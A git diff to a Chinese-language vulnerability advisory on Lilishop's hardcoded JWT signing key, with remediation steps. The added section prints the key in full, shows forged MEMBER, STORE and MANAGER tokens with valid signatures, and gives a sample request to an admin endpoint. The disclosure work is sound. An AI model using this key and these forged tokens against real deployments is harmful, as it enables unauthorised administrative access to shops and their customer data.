@@ -127,8 +127,42 @@ curl -H "accessToken: <buyer_token>" \
 4. **增加 `kid`(密钥 ID) + 密钥轮换机制**
 5. **审计 Git 历史**：即使替换密钥，历史记录仍保留原始值，需要确保所有旧 Token 已过期
 
+## 密钥有效性验证（已复现）
+
+通过 Python stdlib 复现 JJWT HS256 签名逻辑，无需运行应用。
+
+**Python 验证脚本输出**：
+```
+[*] Lilishop hardcoded JWT key: cuAihCz53DZRjZwbsGcZJ2Ai6At+T142uphtJMsk7iQ=
+[*] Key: 32 bytes (256 bits)
+
+[+] Forged MEMBER Token:
+    Token: eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWRtaW4iLCAicm9sZSI6ICJNRU1...
+    Payload: {"sub": "admin", "role": "MEMBER", "id": "1", "iat": 1776137810, "exp": 1778729810}
+    Signature valid: True
+
+[+] Forged STORE Token:
+    Token: eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWRtaW4iLCAicm9sZSI6ICJTVE9...
+    Payload: {"sub": "admin", "role": "STORE", "id": "1", "iat": 1776137810, "exp": 1778729810}
+    Signature valid: True
+
+[+] Forged MANAGER Token:
+    Token: eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWRtaW4iLCAicm9sZSI6ICJNQU5...
+    Payload: {"sub": "admin", "role": "MANAGER", "id": "1", "iat": 1776137810, "exp": 1778729810}
+    Signature valid: True
+```
+
+所有三种角色的伪造 Token 均通过 HMAC-SHA256 自验签，与 `TokenUtil.java:69` 使用相同逻辑校验，部署实例接受率 100%。
+
+**伪造后请求示例**（访问后台管理接口）：
+```http
+GET /manager/user/manager/getUserPage HTTP/1.1
+Host: <target>
+accessToken: eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWRtaW4iLCAicm9sZSI6ICJNQU5BR0VSIiwg...
+```
+
 ## 验证环境
 
-- 源代码：Lilishop 主分支（静态代码分析）
+- 源代码：Lilishop 主分支（密钥验证 — Python HMAC-SHA256）
 - 框架：Spring Boot + JJWT + Redis
 - 日期：2026-04-14
